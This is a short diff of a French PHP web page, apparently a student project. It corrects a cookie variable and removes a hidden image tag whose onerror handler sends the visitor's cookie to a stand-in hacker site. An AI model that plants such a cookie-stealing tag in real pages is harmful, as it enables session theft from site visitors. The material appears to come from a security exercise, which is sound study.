@@ -1,6 +1,6 @@
 <!doctype html>
 <?php
-$cookieperso = $COOKIE['cookieperso'];
+$cookieperso = $_COOKIE['cookieperso'];
 ?>
 <html lang="fr">
 	<head>
@@ -32,7 +32,6 @@ $cookieperso = $COOKIE['cookieperso'];
 				</div>
 			</div>
 			<a href="Rapport_Web_LEGRAND_Cyprien.pdf" target="blank">Vous pouvez consulter mon rapport ici (dans un nouvel onglet)</a>
-			<img src="azerty.jpg" onerror="window.location='http://www.site_du_hacker.com/recuperation_cookie.php?cookie='+$cookiperso;" hidden>
 		</div>
 
 
